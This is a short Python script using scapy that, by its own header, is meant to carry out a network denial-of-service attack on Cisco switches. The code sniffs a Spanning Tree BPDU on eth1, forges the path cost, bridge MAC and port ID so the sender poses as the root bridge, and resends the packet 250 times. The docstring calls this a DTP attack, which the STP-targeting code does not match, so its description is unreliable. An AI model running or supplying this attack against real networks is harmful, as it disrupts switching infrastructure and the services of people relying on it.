#!/usr/bin/env python3.11
""" The Best Way To Predict Future, Is To Create It
    Abraham Lincoln

    This Script To Perform Network-DOS Attack, By Exploiting DTP Feature On Cisco Switches .
	"""

from scapy.all import sniff as sn
import scapy.all as sp
from time import sleep


def DOS_function(sniffed_pkt):
    """
    Start DOS Attack
    By Send Sniffed Packet After Change The Root-Variables (Path Cost, Bridge-MAC Address) .
    :return : Nothing
    """
    for _ in range(250):
        sniffed_pkt[0].show()
        sp.sendp(sniffed_pkt[0], loop=0, verbose=True)
        sleep(1)


# @formatter:off
def sniff_function():
    """Sniffing STP-Packet
    Get Bridge-Port Cost .
    Get BPDU, Bridge-Switch MAC Address .
    Get Bridge-Port ID .
    :return : STP-Sniffed-Packet
    """
    sniffed_pkt = sn(
        filter="ether dst 01:80:c2:00:00:00", iface="eth1", count=1
    )

    # Change Path-Cost of the root-bridge .
    sniffed_pkt[0].pathcost = 0

    # Change Bridge-MAC Address To Root-MAC Address .
    sniffed_pkt[0].bridgemac = sniffed_pkt[0].rootmac

    # Change Port-ID To 1 .
    sniffed_pkt[0].portid = 1

    # Return sniffed_packet .
    return sniffed_pkt


# @formatter:on


packet = sniff_function()
DOS_function(sniffed_pkt=packet)
